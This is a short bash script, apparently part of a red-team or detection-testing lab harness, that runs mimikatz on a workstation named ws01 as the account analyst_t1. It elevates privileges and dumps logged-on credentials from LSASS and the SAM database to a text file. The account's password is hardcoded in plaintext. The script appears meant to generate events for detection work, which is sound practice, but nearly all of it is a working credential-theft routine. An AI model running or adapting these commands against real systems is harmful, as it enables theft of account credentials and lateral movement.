#!/usr/bin/env bash
# T035-CREDS — Post-SYSTEM credential dump from ws01 (analyst_t1 context)
# Runs mimikatz sekurlsa::logonpasswords against lsass using pre-staged tools.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T035-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T035-CREDS post-SYSTEM dump | ${CASE_ID} | T0=${T0} ==="

CMD='
$m = "C:\Tools\ADTools\mimikatz.exe";
if (-not (Test-Path $m)) { throw "mimikatz.exe not found" }
& $m "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" 2>&1 | Tee-Object C:\Tools\ADTools\T035-creds-out.txt;
Write-Output "T035_OK: credential dump written to C:\Tools\ADTools\T035-creds-out.txt"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T035-CREDS "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T035-CREDS run complete ==="
